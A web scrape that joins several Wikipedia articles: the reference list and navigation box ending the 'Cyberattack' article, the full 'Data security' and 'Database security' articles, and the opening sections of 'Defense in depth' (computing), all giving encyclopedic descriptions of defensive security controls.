^ a b c d Prichard, Janet, and Laurie MacDonald. "Cyber Terrorism: A Study of the Extent of Coverage in Computer Security Textbooks." Journal of Information Technology Education. 3. (2004): n. page. Web.

^ Wright, Joe; Jim Harmening (2009). "15".  In Vacca, John (ed.). Computer and Information Security Handbook. Morgan Kaufmann Publications. Elsevier Inc. p. 257. ISBN 978-0-12-374354-1.

^ "ISACA THE RISK IT FRAMEWORK (registration required)" (PDF). isaca.org.

^ Caballero, Albert (2009). "14".  In Vacca, John (ed.). Computer and Information Security Handbook. Morgan Kaufmann Publications. Elsevier Inc. p. 225. ISBN 978-0-12-374354-1.

^ "What is DDoS? (Guest Post)". The Code Files. Retrieved 13 May 2013.

^ "U.S. Senate-Committee on Commerce, Science, and Transportation-A "Kill Chain" Analysis of the 2013 Target Data Breach-March 26, 2014" (PDF). navy.mil. Archived from the original (PDF) on 6 October 2016. Retrieved 30 June 2016.

^ Janczewski, Lech, and Andrew Colarik. Cyber Warfare and Cyber Terrorism. Hershey, New York: Information Science Reference, 2008. Web.

^ "Indonesia Tops China as Cyber Attack Capital". PC Magazine. 16 October 2013.

^ "Azerbaijani hackers broke into over 90 armenian websites – VIDEO". Azerbaycan24. 27 September 2020.

^ Giles, Christopher (26 October 2020). "Nagorno-Karabakh: The Armenian-Azeri 'information wars'". BBC.

^ "Canada's foreign ministry hacked, services hit". Reuters. Reuters. 24 January 2022. Retrieved 25 January 2022.

^ a b c Krekel, Bryan. People's Republic of China. The US-China Economic and Security Review Commission.Capability of the People's Republic of China to Conduct Cyber Warfare and Computer Network Exploitation. Virginia: Northrop Grumman, 2009. Web.

^ Krebs, Brian (5 March 2021). "At Least 30,000 U.S. Organizations Newly Hacked Via Holes in Microsoft's Email Software". krebsonsecurity.com. Retrieved 14 April 2021.

^ Ian Traynor (17 May 2007). "Russia accused of unleashing cyberwar to disable Estonia". The Guardian.

^ "War in the fifth domain. Are the mouse and keyboard the new weapons of conflict?". The Economist. 1 July 2010. Retrieved 2 July 2010. Important thinking about the tactical and legal concepts of cyber-warfare is taking place in a former Soviet barracks in Estonia, now home to NATO's "centre of excellence" for cyber-defence. It was established in response to what has become known as "Web War 1", a concerted denial-of-service attack on Estonian government, media and bank web servers that was precipitated by the decision to move a Soviet-era war memorial in central Tallinn in 2007.

^ "An Egyptian cyber attack on Ethiopia by hackers is the latest strike over the Grand Dam". Quartz. 27 June 2020.

^ "Cyber Indian Army". Express Tirbune. 30 November 2010. Retrieved 8 June 2013.

^ a b Abbasi, Waseem (6 April 2013). "Pakistani hackers defaced over 1,000 Indian websites". The News International 2013. Archived from the original on 23 July 2015. Retrieved 8 June 2013.

^ "National Cyber Security Policy-2013 | Ministry of Electronics and Information Technology, Government of India". www.meity.gov.in. Retrieved 19 August 2020.

^ "Cyber Secure Pakistan' initiative launched". The News International, April 2013. 22 April 2013. Archived from the original on 23 June 2013. Retrieved 10 June 2013.

^ "Major cyber attack by Indian intelligence identified: ISPR". The Express Tribune. 12 August 2020. Retrieved 26 September 2020.

^ "Iran Repels Cyberattack Targeting Internet Backbone". Financial Tribune. 8 February 2020. Retrieved 8 February 2020.

^ "در حمله سایبری همه ۴۳۰۰ پمپ بنزین در ایران "دچار اختلال شدند"". رادیو فردا (in Persian). Retrieved 2 November 2021.

^ "A cyberattack paralyzed every gas station in Iran". NPR. Associated Press. 27 October 2021. Retrieved 2 November 2021.

^ "Some health service disruption after HSE cyber attack". RTÉ News and Current Affairs. Retrieved 14 May 2021.

^ "Irish health service hit by 'very sophisticated' ransomware attack". Reuters. Retrieved 14 May 2021.

^ "Irish health service hit by cyber attack". BBC News. Retrieved 14 May 2021.

^ "Ransomware attack disrupts Irish health services". The Guardian. Retrieved 14 May 2021.

^ "Cyber attack 'most significant on Irish state'". BBC News. 15 May 2021. Retrieved 18 May 2021.

^ Lally, Conor (18 May 2021). "Wizard Spider profile: Suspected gang behind HSE attack is part of world's first cyber-cartel". The Irish Times. Retrieved 5 September 2021.

^ Reynolds, Paul (18 May 2021). "Wizard spider: Who are they and how do they operate?". RTÉ News and Current Affairs. Retrieved 18 May 2021.

^ Gallagher, Conor; McQuinn, Cormac. "Dark web 'dump sites' being monitored for HSE data after hack". The Irish Times. Retrieved 18 May 2021.

^ Horgan-Jones, Jack; Lally, Conor. "Scale of damage from cyberattack on HSE systems will not be known for days". The Irish Times. Retrieved 15 May 2021.

^ "Iran cyberattack on Israel's water supply could have sickened hundreds – report". The Times of Israel. 1 June 2020.

^ "Norway accuses Russian hackers of parliament attack". The Local Norway. 8 December 2020. Retrieved 21 December 2020.(subscription required)

^ "Putin says Russia targeted by almost 25 million cyber-attacks during World Cup". The Telegraph. 16 July 2018. Archived from the original on 12 January 2022.

^ "Russia Fends Off 25 Million Cyber-Attacks During World Cup". Infosecurity Magazine. 16 July 2018.

^ "US and Russia clash over power grid 'hack attacks". BBC News. 18 June 2019.

^ "How Not To Prevent a Cyberwar With Russia". Wired. 18 June 2019.

^ Schmidt, Michael S. (19 October 2020). "U.S. Charges Russian Intelligence Officers in Major Cyberattacks". The New York Times. Retrieved 19 October 2020.

^ "Destructive malware targeting Ukrainian organizations". Microsoft Security Blog. 16 January 2022. Retrieved 17 January 2022.

^ "Malware attacks targeting Ukraine government". Microsoft On the Issues. 16 January 2022. Retrieved 17 January 2022.

^ "Inside the UAE's secret hacking team of American mercenaries". Reuters. Retrieved 30 January 2019.

^ Lewis, James, and Katrina Timlin. United States. Center for Strategic and International Studies. Cybersecurity and Cyberwarfare: Preliminary Assessment of National Doctrine and Organization. Washington, D.C.:, 2011. Web.

^ United States. Review Team of Government Cybersecurity Experts. Cyberspace Policy Review: Assuring a Trusted and Resilient Information and Communications Infrastructure. Washington, D.C.:, Web.

^ Rozens, Tracy (19 May 2016). "Expert: More work needed to get private sector cyber secure". Homeland Preparedness News. Retrieved 19 July 2016.

^ "Sanctions: U.S. action on cyber crime" (PDF). PwC Financial Services Regulatory Practice, April 2015.

^ Koppel, Ted (2015). Lights out: a cyberattack, a nation unprepared, surviving the aftermath (First ed.). New York. ISBN 9780553419962. OCLC 910424314.

^ "Prosecutors open homicide case after hacker attack on German hospital". Reuters. 18 September 2020. Retrieved 9 October 2020.

^ Loukas, George (June 2015). Cyber-Physical Attacks A growing invisible threat. Oxford, UK: Butterworh-Heinemann (Elsevier). p. 65. ISBN 9780128012901.

^ a b c d e Lyons, Marty. United States. Homeland Security. Threat Assessment of Cyber Warfare. Washington, D.C.:, 2005. Web.

^ Krebs, Brian. "Security Fix - Avoid Windows Malware: Bank on a Live CD". Voices.washingtonpost.com. Retrieved 23 June 2011.

^ "Indian Companies at Center of Global Cyber Heist". onlinenewsoman.com. Archived from the original on 31 December 2016. Retrieved 6 December 2017.

^ Evan Perez (18 May 2015). "FBI: Hacker claimed to have taken over flight's engine controls". CNN.

^ "Cyber Daily: Human-Rights Groups Want Law Enforcement to Do More to Stop Hospital Cyberattacks". Wall Street Journal. June 2020. Retrieved 1 June 2020.


Sanaei, M. G., Isnin, I. F., & Bakhtiari, M. (2013). Performance Evaluation of Routing Protocol on AODV and DSR Under Wormhole Attack. International Journal of Computer Networks and Communications Security, Volume 1, Issue 1, ISSN 2308-9830.
Further reading[edit]
Finnemore, Martha; Hollis, Duncan B (2020), "Beyond Naming and Shaming: Accusations and International Law in Cybersecurity", European Journal of International Law, doi:10.2139/ssrn.3347958, S2CID 159072423
External links[edit]



Wikimedia Commons has media related to Cyberattacks.

July 2015 Cyber Attacks Statistics – Hackmageddon
Norse Attack Map
Term in FISMApedia
vteGlobal catastrophic risks
Future of the Earth
Future of an expanding universe
Ultimate fate of the universe
Technological
Chemical warfare
Cyberattack
Cyberwarfare
Cyberterrorism
Cybergeddon
Gray goo
Nanoweapons
Kinetic bombardment
Relativistic kinetic kill vehicle
Nuclear warfare
Mutual assured destruction
Dead Hand
Doomsday Clock
Doomsday device
Antimatter weapon
Electromagnetic pulse (EMP)
Safety of high-energy particle collision experiments
Micro black hole
Strangelet
Synthetic intelligence / Artificial intelligence
AI takeover
Existential risk from artificial intelligence
Technological singularity
Transhumanism
Year 2000 problem
Year 2038 problem
Year 10,000 problem
Sociological
Anthropogenic hazard
Collapsology
Doomsday argument
Self-Indication Assumption Doomsday argument rebuttal
Self-referencing doomsday argument rebuttal
Economic collapse
Malthusian catastrophe
New World Order (conspiracy theory)
Nuclear holocaust
cobalt
famine
winter
Societal collapse
World War III
EcologicalClimate change
Anoxic event
Biodiversity loss
Mass mortality event
Cascade effect
Cataclysmic pole shift hypothesis
Climate apocalypse
Deforestation
Desertification
Extinction risk from climate change
Tipping points in the climate system
Flood basalt
Global dimming
Global terrestrial stilling
Global warming
Hypercane
Ice age
Ecocide
Ecological collapse
Environmental degradation
Habitat destruction
Human impact on the environment
coral reefs
on marine life
Land degradation
Land consumption
Land surface effects on climate
Ocean acidification
Ozone depletion
Resource depletion
Sea level rise
Supervolcano
winter
Verneshot
Water pollution
Water scarcity
Earth Overshoot Day
Overexploitation
Overpopulation
Human overpopulation
BiologicalExtinction
Extinction event
Holocene extinction
Human extinction
List of extinction events
Genetic erosion
Genetic pollution
Others
Biodiversity loss
Decline in amphibian populations
Decline in insect populations
Biotechnology risk
Biological agent
Biological warfare
Bioterrorism
Colony Collapse Disorder
Defaunation
Interplanetary contamination
Pandemic
Pollinator decline
Overfishing
Astronomical
Big Crunch
Big Rip
Coronal mass ejection
Geomagnetic storm
False vacuum decay
Gamma-ray burst
Heat death of the universe
Proton decay
Virtual black hole
Impact event
Asteroid impact avoidance
Asteroid impact prediction
Potentially hazardous object
Near-Earth object
winter
Rogue planet
Near-Earth supernova
Hypernova
Micronova
Solar flare
Stellar collision
Eschatological
Buddhist
Maitreya
Three Ages
Hindu
Kalki
Kali Yuga
Last Judgement
Second Coming
1 Enoch
Daniel
Abomination of Desolation
Prophecy of Seventy Weeks
Messiah
Christian
Dispensationalism
Futurism
Historicism
Interpretations of Revelation
 Idealism
Preterism
2 Esdras
2 Thessalonians
Man of sin
Katechon
Antichrist
Book of Revelation
Events
Four Horsemen of the Apocalypse
Lake of fire
Number of the Beast
Seven bowls
Seven seals
The Beast
Two witnesses
War in Heaven
Whore of Babylon
Great Apostasy
New Earth
New Jerusalem
Olivet Discourse
Great Tribulation
Son of Perdition
Sheep and Goats
Islamic
Al-Qa'im
Beast of the Earth
Dhul-Qarnayn
Dhul-Suwayqatayn
Dajjal
Israfil
Mahdi
Sufyani
Jewish
Messiah
War of Gog and Magog
Third Temple
Norse
Zoroastrian
Saoshyant
Others
2011 end times prediction
2012 phenomenon
Apocalypse
Apocalyptic literature
Apocalypticism
Armageddon
Blood moon prophecy
Earth Changes
End time
Gog and Magog
List of dates predicted for apocalyptic events
Messianism
Messianic Age
Millenarianism
Millennialism
Premillennialism
Amillennialism
Postmillennialism
Nemesis (hypothetical star)
Nibiru cataclysm
Rapture
Prewrath
Post-tribulation rapture
Resurrection of the dead
World to come
Fictional
Alien invasion
Apocalyptic and post-apocalyptic fiction
List of apocalyptic and post-apocalyptic fiction
List of apocalyptic films
Climate fiction
Disaster films
List of disaster films
List of fictional doomsday devices
Zombie apocalypse
Zombie
Organizations
Centre for the Study of Existential Risk
Future of Humanity Institute
Future of Life Institute
Nuclear Threat Initiative
General
Cyber ransom
Cyberwarfare
Depression
Droughts
Epidemic
Famine
Financial crisis
Pandemic
Riots
Social crisis
Survivalism

 World portal
 Categories
Apocalypticism
Future problems
Hazards
Risk analysis
Doomsday scenarios





Retrieved from "https://en.wikipedia.org/w/index.php?title=Cyberattack&oldid=1130243671"
Categories: CyberattacksCybercrimeAttacks by methodSecurity complianceHidden categories: Pages with non-numeric formatnum argumentsCS1 Persian-language sources (fa)Pages containing links to subscription-only contentArticles with short descriptionShort description is different from WikidataUse dmy dates from August 2019Use American English from August 2019All Wikipedia articles written in American EnglishArticles needing additional references from July 2014All articles needing additional referencesArticles that may contain original research from March 2015All articles that may contain original researchArticles needing additional references from July 2013Wikipedia articles with style issues from August 2019All articles with style issuesCommons category link is on WikidataWikipedia articles with ASCII art
 



From Wikipedia, the free encyclopedia


Protection of digital data
Data security  means protecting digital data, such as those in a database, from destructive forces and from the unwanted actions of unauthorized users,[1] such as a cyberattack or a data breach.[2]


Technologies[edit]
Disk encryption[edit]
Main article: Disk encryption
Disk encryption refers to encryption technology that encrypts data on a hard disk drive. [3] Disk encryption typically takes form in either software (see disk encryption software) or hardware (see disk encryption hardware). Disk encryption is often referred to as on-the-fly encryption (OTFE) or transparent encryption.

Software versus hardware-based mechanisms for protecting data[edit]
Software-based security solutions encrypt the data to protect it from theft. However, a malicious program or a hacker could corrupt the data to make it unrecoverable, making the system unusable. Hardware-based security solutions prevent read and write access to data, which provides very strong protection against tampering and unauthorized access.
Hardware-based security or assisted computer security offers an alternative to software-only computer security. Security tokens such as those using PKCS#11 or a mobile phone may be more secure due to the physical access required in order to be compromised.[4] Access is enabled only when the token is connected and the correct PIN is entered (see two-factor authentication). However, dongles can be used by anyone who can gain physical access to it. Newer technologies in hardware-based security solve this problem by offering full proof of security for data.[5]
Working off hardware-based security: A hardware device allows a user to log in, log out and set different levels through manual actions. The device uses biometric technology to prevent malicious users from logging in, logging out, and changing privilege levels. The current state of a user of the device is read by controllers in peripheral devices such as hard disks. Illegal access by a malicious user or a malicious program is interrupted based on the current state of a user by hard disk and DVD controllers making illegal access to data impossible. Hardware-based access control is more secure than the protection provided by the operating systems as operating systems are vulnerable to malicious attacks by viruses and hackers. The data on hard disks can be corrupted after malicious access is obtained. With hardware-based protection, the software cannot manipulate the user privilege levels. A hacker or a malicious program cannot gain access to secure data protected by hardware or perform unauthorized privileged operations. This assumption is broken only if the hardware itself is malicious or contains a backdoor.[6] The hardware protects the operating system image and file system privileges from being tampered with. Therefore, a completely secure system can be created using a combination of hardware-based security and secure system administration policies.

Backups[edit]
Main article: Backup
Backups are used to ensure data that is lost can be recovered from another source. It is considered essential to keep a backup of any data in most industries and the process is recommended for any files of importance to a user.[7]

Data masking[edit]
Main article: Data masking
Data masking of structured data is the process of obscuring (masking) specific data within a database table or cell to ensure that data security is maintained and sensitive information is not exposed to unauthorized personnel.[8] This may include masking the data from users (for example so banking customer representatives can only see the last four digits of a customer's national identity number), developers (who need real production data to test new software releases but should not be able to see sensitive financial data), outsourcing vendors, etc.[9]

Data erasure[edit]
Main article: Data erasure
Data erasure is a method of software-based overwriting that completely wipes all electronic data residing on a hard drive or other digital media to ensure that no sensitive data is lost when an asset is retired or reused.
[10]

International laws and standards[edit]
International laws[edit]
In the UK, the Data Protection Act is used to ensure that personal data is accessible to those whom it concerns, and provides redress to individuals if there are inaccuracies.[11] This is particularly important to ensure individuals are treated fairly, for example for credit checking purposes. The Data Protection Act states that only individuals and companies with legitimate and lawful reasons can process personal information and cannot be shared. Data Privacy Day is an international holiday started by the Council of Europe that occurs every January 28. 
[12]
Since the General Data Protection Regulation (GDPR) of the European Union (EU) became law on May 25, 2018, organizations may face significant penalties of up to €20 million or 4% of their annual revenue if they do not comply with the regulation.[13]  It is intended that GDPR will force organizations to understand their data privacy risks and take the appropriate measures to reduce the risk of unauthorized disclosure of consumers’ private information.
[14]

International standards[edit]
The international standards ISO/IEC 27001:2013 and ISO/IEC 27002:2013 cover data security under the topic of information security, and one of its cardinal principles is that all stored information, i.e. data, should be owned so that it is clear whose responsibility it is to protect and control access to that data.[15][16] The following are examples of organizations that help strengthen and standardize computing security:
The Trusted Computing Group is an organization that helps standardize computing security technologies.
The Payment Card Industry Data Security Standard (PCI DSS) is a proprietary international information security standard for organizations that handle cardholder information for the major debit, credit, prepaid, e-purse, automated teller machines, and point of sale cards.[17]
The General Data Protection Regulation (GDPR) proposed by the European Commission will strengthen and unify data protection for individuals within the EU, whilst addressing the export of personal data outside the EU.

See also[edit]

Copy protection
Cyber-security regulation
Data-centric security
Data erasure
Data masking
Data recovery
Digital inheritance
Disk encryption
Comparison of disk encryption software
Identity-based security
Information security
IT network assurance
Pre-boot authentication
Privacy engineering
Privacy law
Raz-Lee
Security breach notification laws
Single sign-on
Smart card
Tokenization
Transparent data encryption
USB flash drive security

Notes and references[edit]


^ Summers, G. (2004). Data and databases.  In: Koehne, H Developing Databases with Access: Nelson Australia Pty Limited. p4-5.

^ "Knowing Your Data to Protect Your Data". IT Business Edge. 2017-09-25. Retrieved 2022-11-03.

^ "Full disk encryption (FDE)". encyclopedia.kaspersky.com. Retrieved 2022-11-03.

^ Thanh, Do van; Jorstad, Ivar; Jonvik, Tore; Thuan, Do van (2009). "Strong authentication with mobile phone as security token". 2009 IEEE 6th International Conference on Mobile Adhoc and Sensor Systems: 777–782. doi:10.1109/MOBHOC.2009.5336918. ISBN 978-1-4244-5114-2. S2CID 5470548.

^ Stubbs, Rob (Sep 10, 2019). "Why the World is Moving to Hardware-Based Security". Fortanix. Retrieved 30 September 2022.

^ Waksman, Adam; Sethumadhavan, Simha (2011), "Silencing Hardware Backdoors" (PDF), Proceedings of the IEEE Symposium on Security and Privacy, Oakland, California, archived (PDF) from the original on 2013-09-28

^ "Back-ups | Stay Smart Online". Archived from the original on 2017-07-07.

^ "Data Masking Definition". Archived from the original on 2017-02-27. Retrieved 1 March 2016.

^ "data masking". Archived from the original on 5 January 2018. Retrieved 29 July 2016.

^ Michael Wei; Laura M. Grupp; Frederick E. Spada; Steven Swanson (2011). "Reliably Erasing Data From Flash-Based Solid State Drives". FAST'11: Proceedings of the 9th USENIX conference on File and storage technologies. Wikidata Q115346857. Retrieved 2022-11-22.

^ "data protection act". Archived from the original on 13 April 2016. Retrieved 29 July 2016.

^ Peter Fleischer, Jane Horvath, Shuman Ghosemajumder (2008). "Celebrating data privacy". Google Blog. Archived from the original on 20 May 2011. Retrieved 12 August 2011.{{cite web}}:  CS1 maint: multiple names: authors list (link)

^ "GDPR Penalties". Archived from the original on 2018-03-31.

^ "Detect and Protect for Digital Transformation". Informatica. Informatica. Retrieved 27 April 2018.

^ "ISO/IEC 27001:2013". ISO. Retrieved 2022-11-03.

^ "ISO/IEC 27002:2013". ISO. Retrieved 2022-11-03.

^ "PCI DSS Definition". Archived from the original on 2 March 2016. Retrieved 1 March 2016.


External links[edit]
Getting Ready for New Data Laws - Local Gov Magazine
EU General Data Protection Regulation (GDPR)
Countering ransomware attacks



Wikimedia Commons has media related to Data security.

vteData
Augmentation
Analysis
Archaeology
Big
Cleansing
Collection
Compression
Corruption
Curation
Degradation
Editing
ETL/ELT
Extract
Transform
Load
Farming
Format management
Fusion
Integration
Integrity
Library
Lineage
Loss
Management
Migration
Mining
Philanthropy
Pre-processing
Preservation
Protection (privacy)
Publishing
Recovery
Reduction
Retention
Quality
Science
Scraping
Scrubbing
Security
Stewardship
Storage
Validation
Warehouse
Wrangling/munging

vtePrivacyPrinciples
Expectation of privacy
Right to privacy
Right to be forgotten
Post-mortem privacy
Privacy laws
Australia
Brazil
Canada
China
Denmark
England
European Union
Germany
Ghana
New Zealand
Russia
Singapore
Switzerland
United States
California, amended in 2020
Data protection authorities
Australia
Denmark
European Union
France
Germany
Indonesia
Ireland
Isle of Man
Norway
Philippines
Poland
South Korea
Spain
Sweden
Switzerland
Thailand
Turkey
United Kingdom
Areas
Consumer
Medical
Workplace
Information privacy
Law
Financial
Internet
Personal data
Personal identifier
Social networking services
Privacy-enhancing technologies
Privacy engineering
Secret ballot
Advocacy organizations
American Civil Liberties Union
Center for Democracy and Technology
Computer Professionals for Social Responsibility
Data Privacy Lab
Electronic Frontier Foundation
Electronic Privacy Information Center
European Digital Rights
Future of Privacy Forum
Global Network Initiative
International Association of Privacy Professionals
NOYB
Privacy International
See also
Anonymity
Carding
Cellphone surveillance
Cyberstalking
Data security
Eavesdropping
Electronic harassment
Global surveillance
Identity theft
Mass surveillance
Panopticon
Privacy engineering
Search warrant
Telephone tapping
Human rights
Personality rights

 Category





Retrieved from "https://en.wikipedia.org/w/index.php?title=Data_security&oldid=1134555413"
Categories: Data securityData managementHidden categories: CS1 maint: multiple names: authors listArticles with short descriptionShort description is different from WikidataCommons category link from Wikidata
 



From Wikipedia, the free encyclopedia


Database security  concerns the use of a broad range of information security controls to protect databases (potentially including the data, the database applications or stored functions, the database systems, the database servers and the associated network links) against compromises of their confidentiality, integrity and availability. It involves various types or categories of controls, such as technical, procedural/administrative and physical. 
Security risks to database systems include, for example:

Unauthorized or unintended activity or misuse by authorized database users, database administrators, or network/systems managers, or by unauthorized users or hackers (e.g. inappropriate access to sensitive data, metadata or functions within databases, or inappropriate changes to the database programs, structures or security configurations);
Malware infections causing incidents such as unauthorized access, leakage or disclosure of personal or proprietary data, deletion of or damage to the data or programs, interruption or denial of authorized access to the database, attacks on other systems and the unanticipated failure of database services;
Overloads, performance constraints and capacity issues resulting in the inability of authorized users to use databases as intended;
Physical damage to database servers caused by computer room fires or floods, overheating, lightning, accidental liquid spills, static discharge, electronic breakdowns/equipment failures and obsolescence;
Design flaws and programming bugs in databases and the associated programs and systems, creating various security vulnerabilities (e.g. unauthorized privilege escalation), data loss/corruption, performance degradation etc.;
Data corruption and/or loss caused by the entry of invalid data or commands, mistakes in database or system administration processes, sabotage/criminal damage etc.
Ross J. Anderson has often said that by their nature large databases will never be free of abuse by breaches of security; if a large system is designed for ease of access it becomes insecure; if made watertight it becomes impossible to use. This is sometimes known as Anderson's Rule.[1]
Many layers and types of information security control are appropriate to databases, including:

Access control
Auditing
Authentication
Encryption
Integrity controls
Backups
Application security
Database Security applying Statistical Method
Databases have been largely secured against hackers through network security measures such as firewalls, and network-based intrusion detection systems. While network security controls remain valuable in this regard, securing the database systems themselves, and the programs/functions and data within them, has arguably become more critical as networks are increasingly opened to wider access, in particular access from the Internet. Furthermore, system, program, function and data access controls, along with the associated user identification, authentication and rights management functions, have always been important to limit and in some cases log the activities of authorized users and administrators. In other words, these are complementary approaches to database security, working from both the outside-in and the inside-out as it were.
Many organizations develop their own "baseline" security standards and designs detailing basic security control measures for their database systems. These may reflect general information security requirements or obligations imposed by corporate information security policies and applicable laws and regulations (e.g. concerning privacy, financial management and reporting systems), along with generally accepted good database security practices (such as appropriate hardening of the underlying systems) and perhaps security recommendations from the relevant database system and software vendors. The security designs for specific database systems typically specify further security administration and management functions (such as administration and reporting of user access rights, log management and analysis, database replication/synchronization and backups) along with various business-driven information security controls within the database programs and functions (e.g. data entry validation and audit trails). Furthermore, various security-related activities (manual controls) are normally incorporated into the procedures, guidelines etc. relating to the design, development, configuration, use, management and maintenance of databases.


Privileges[edit]
Two types of privileges are important relating to database security within the database environment: system privileges and object privileges.

System Privileges[edit]
System privileges allow a user to perform administrative actions in a database.

Object Privileges[edit]
Object privileges allow for the use of certain operations on database objects as authorized by another user. Examples include: usage, select, insert, update, and references.[2]
The Principal of least Privilege, and Separation of duties:
Databases that fall under internal controls (that is, data used for public reporting, annual reports, etc.) are subject to the separation of duties, meaning there must be segregation of tasks between development, and production. Each task has to be validated (via code walk-through/fresh eyes) by a third person who is not writing the actual code. The database developer should not be able to execute anything in production without an independent review of the documentation/code for the work that is being performed. Typically, the role of the developer is to pass code to a DBA; however, given the cutbacks that have resulted from the economic downturn, a DBA might not be readily available. If a DBA is not involved, it is important, at minimum, for a peer to conduct a code review. This ensures that the role of the developer is clearly separate.[citation needed]
Another point of internal control is adherence to the principle of providing the least amount of privileges, especially in production. To allow developers more access to get their work done, it is much safer to use impersonation for exceptions that require elevated privileges (e.g. EXECUTE AS or sudo to do that temporarily). Often developers may dismiss this as “overhead” while on their path to coding glory. Please be aware, however, that DBAs must do all that is considered responsible because they are the de facto data stewards of the organization and must comply with regulations and the law.[3]

Vulnerability Assessments to Manage Risk and Compliance[edit]
Further information: application security
One technique for evaluating database security involves performing vulnerability assessments or penetration tests against the database. Testers attempt to find security vulnerabilities that could be used to defeat or bypass security controls, break into the database, compromise the system etc. Database administrators or information security administrators may for example use automated vulnerability scans to search out misconfiguration of controls (often referred to as 'drift') within the layers mentioned above along with known vulnerabilities within the database software. The results of such scans are used to harden the database (improve security) and close off the specific vulnerabilities identified, but other vulnerabilities often remain unrecognized and unaddressed.
In database environments where security is critical, continual monitoring for compliance with standards improves security. Security compliance requires, amongst other procedures, patch management and the review and management of permissions (especially public) granted to objects within the database. Database objects may include table or other objects listed in the Table link. The permissions granted for SQL language commands on objects are considered in this process. Compliance monitoring is similar to vulnerability assessment, except that the results of vulnerability assessments generally drive the security standards that lead to the continuous monitoring program. Essentially, vulnerability assessment is a preliminary procedure to determine risk where a compliance program is the process of on-going risk assessment.
The compliance program should take into consideration any dependencies at the application software level as changes at the database level may have effects on the application software or the application server.

Abstraction[edit]
Application level authentication and authorization mechanisms may be effective means of providing abstraction from the database layer. The primary benefit of abstraction is that of a single sign-on capability across multiple databases and platforms. A single sign-on system stores the database user's credentials and authenticates to the database on behalf of the user. Abstraction is the idea of making complex ideas easier to understand. 

Database activity monitoring (DAM)[edit]
Another security layer of a more sophisticated nature includes real-time database activity monitoring, either by analyzing protocol traffic (SQL) over the network, or by observing local database activity on each server using software agents, or both. Use of agents or native logging is required to capture activities executed on the database server, which typically include the activities of the database administrator. Agents allow this information to be captured in a fashion that can not be disabled by the database administrator, who has the ability to disable or modify native audit logs.
Analysis can be performed to identify known exploits or policy breaches, or baselines can be captured over time to build a normal pattern used for detection of anomalous activity that could be indicative of intrusion. These systems can provide a comprehensive database audit trail in addition to the intrusion detection mechanisms, and some systems can also provide protection by terminating user sessions and/or quarantining users demonstrating suspicious behavior. Some systems are designed to support separation of duties (SOD), which is a typical requirement of auditors. SOD requires that the database administrators who are typically monitored as part of the DAM, not be able to disable or alter the DAM functionality. This requires the DAM audit trail to be securely stored in a separate system not administered by the database administration group.

Native audit[edit]
In addition to using external tools for monitoring or auditing, native database audit capabilities are also available for many database platforms. The native audit trails are extracted on a regular basis and transferred to a designated security system where the database administrators do/should not have access. This ensures a certain level of segregation of duties that may provide evidence the native audit trails were not modified by authenticated administrators, and should be conducted by a security-oriented senior DBA group with read rights into production. Turning on native impacts the performance of the server. Generally, the native audit trails of databases do not provide sufficient controls to enforce separation of duties; therefore, the network and/or kernel module level host based monitoring capabilities provides a higher degree of confidence for forensics and preservation of evidence.

Process and procedures[edit]
A good database security program includes the regular review of privileges granted to user accounts and accounts used by immediate processes. For individual accounts a two-factor authentication system improves security but adds complexity and cost. Accounts used by automated processes require appropriate controls around password storage such as sufficient encryption and access controls to reduce the risk of compromise.
In conjunction with a sound database security program, an appropriate disaster recovery program can ensure that service is not interrupted during a security incident, or any incident that results in an outage of the primary database environment. An example is that of replication for the primary databases to sites located in different geographical regions.[4]
After an incident occurs, database forensics can be employed to determine the scope of the breach, and to identify appropriate changes to systems and processes.

See also[edit]
Negative database
Database firewall
FIPS 140-2 US federal standard for authenticating a cryptography module
Virtual private database
References[edit]


^ Guardian newspaper article on a security breach, in which Anderson's Rule is formulated

^ Stephens, Ryan (2011). Sams teach yourself SQL in 24 hours. Indianapolis, Ind: Sams. ISBN 9780672335419.

^ "Database Security Best Practices". technet.microsoft.com. Archived from the original on 2016-09-15. Retrieved 2016-09-02.

^ Seema Kedar (1 January 2009). Database Management Systems. Technical Publications. p. 15. ISBN 978-81-8431-584-4.


External links[edit]
https://web.archive.org/web/20080511155031/http://iase.disa.mil/stigs/checklist/index.html
https://web.archive.org/web/20080515131426/http://iase.disa.mil/stigs/stig/index.html
vteDatabaseMain
Requirements
Theory
Models
Database management system
Machine
Server
Application
Connection
datasource
DSN
Administrator
Lock
Types
Tools
Languages
Data definition
Data manipulation
Query
information retrieval
Security
Activity monitoring
Audit
Forensics
Negative database
Design
Entities and relationships (and Enhanced notation)
Normalization
Schema
Refactoring
Cardinality
Programming
Abstraction layer
Object–relational mapping
Management
Virtualization
Tuning
caching
Migration
Preservation
Integrity
See also
Database-centric architecture
Intelligent database
Two-phase locking
Locks with ordered sharing
Load file
Publishing
Halloween Problem
Log shipping

 Category
 WikiProject





Retrieved from "https://en.wikipedia.org/w/index.php?title=Database_security&oldid=1100523258"
Categories: Database securityHidden categories: All articles with unsourced statementsArticles with unsourced statements from November 2021
 



From Wikipedia, the free encyclopedia


Concept in information security
For the military strategy, see Defence in depth.
This article needs additional citations for verification. Please help improve this article by adding citations to reliable sources. Unsourced material may be challenged and removed.Find sources: "Defense in depth" computing – news · newspapers · books · scholar · JSTOR (April 2012) (Learn how and when to remove this template message)
Defense in depth is a concept used in information security in which multiple layers of security controls (defense) are placed throughout an information technology (IT) system. Its intent is to provide redundancy in the event a security control fails or a vulnerability is exploited that can cover aspects of personnel, procedural, technical and physical security for the duration of the system's life cycle.


Background[edit]
The idea behind the defense in depth approach is to defend a system against any particular attack using several independent methods.[1] It is a layering tactic, conceived[2] by the National Security Agency (NSA) as a comprehensive approach to information and electronic security.[3][4] The term defense in depth in computing is inspired by a military strategy of the same name, but is quite different in concept. The military strategy revolves around having a weaker perimeter defense and intentionally yielding space to buy time, envelop, and ultimately counter-attack an opponent, whereas the information security strategy simply involves multiple layers of controls, but not intentionally ceding ground (cf. honeypot.)

Controls[edit]
Defense in depth can be divided into three areas: Physical, Technical, and Administrative.[5]

Physical[edit]
Physical controls[3] are anything that physically limits or prevents access to IT systems. Fences, guards, dogs, and CCTV systems and the like.

Technical[edit]
Technical controls are hardware or software whose purpose is to protect systems and resources. Examples of technical controls would be disk encryption, File integrity software, and authentication. Hardware technical controls differ from physical controls in that they prevent access to the contents of a system, but not the physical systems themselves.

Administrative[edit]
Administrative controls are organization's policies and procedures. Their purpose is to ensure that there is proper guidance available in regard to security and that regulations are met. They include things such as hiring practices, data handling procedures, and security requirements.

Methods[edit]
Using more than one of the following layers constitutes an example of defense in depth.

System and application[edit]
Antivirus software
Authentication and password security
Encryption
Hashing passwords
Logging and auditing
Multi-factor authentication
